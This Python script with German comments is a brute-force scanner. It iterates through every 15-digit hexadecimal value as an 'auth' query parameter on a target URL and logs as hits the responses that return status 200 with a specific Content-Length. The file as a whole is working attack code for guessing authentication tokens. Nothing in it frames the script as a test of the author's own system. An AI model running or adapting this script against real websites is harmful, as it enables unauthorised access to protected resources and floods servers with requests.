import requests
import time
from datetime import datetime

# =========================
# KONFIGURATION
# =========================
BASE_URL = "https://example.com/index.php"
TARGET_CONTENT_LENGTH = 22874

# HEX-Range (resume-fähig!)
START_HEX = "000000000000000"
END_HEX   = "fffffffffffffff"   # inklusiv

TIMEOUT = 10
SLEEP_BETWEEN_REQUESTS = 0.05   # Sekunden (0 = kein Delay)

OUTPUT_FILE = "hits_content_length_22874.txt"
ERROR_LOG   = "errors.log"

# =========================
# SESSION SETUP
# =========================
session = requests.Session()
session.headers.update({
    "User-Agent": "HEX-Auth-Scanner/1.1",
    "Accept": "*/*",
    "Connection": "close"
})

# =========================
# HELFER
# =========================
def log_error(msg):
    with open(ERROR_LOG, "a") as f:
        f.write(msg + "\n")

def check_auth(hex_value, outfile):
    url = f"{BASE_URL}?auth={hex_value}"

    try:
        r = session.get(
            url,
            timeout=TIMEOUT,
            allow_redirects=True,
            verify=True
        )

        cl = r.headers.get("Content-Length")

        if (
            r.status_code == 200
            and cl is not None
            and int(cl) == TARGET_CONTENT_LENGTH
        ):
            timestamp = datetime.utcnow().isoformat()
            line = f"{timestamp} auth={hex_value} status=200 content-length={cl}"
            print("[HIT]", line)
            outfile.write(line + "\n")
            outfile.flush()

    except requests.RequestException as e:
        log_error(f"{hex_value} ERROR {str(e)}")

# =========================
# MAIN
# =========================
def main():
    start = int(START_HEX, 16)
    end   = int(END_HEX, 16)

    print("[*] HTTPS Auth HEX Scan starts")
    print("[*] URL:", BASE_URL)
    print("[*] Range:", START_HEX, "→", END_HEX)
    print("[*] Target Content-Length:", TARGET_CONTENT_LENGTH)

    with open(OUTPUT_FILE, "a") as outfile:
        for i in range(start, end + 1):
            hex_value = f"{i:015x}"
            check_auth(hex_value, outfile)

            if SLEEP_BETWEEN_REQUESTS > 0:
                time.sleep(SLEEP_BETWEEN_REQUESTS)

if __name__ == "__main__":
    main()
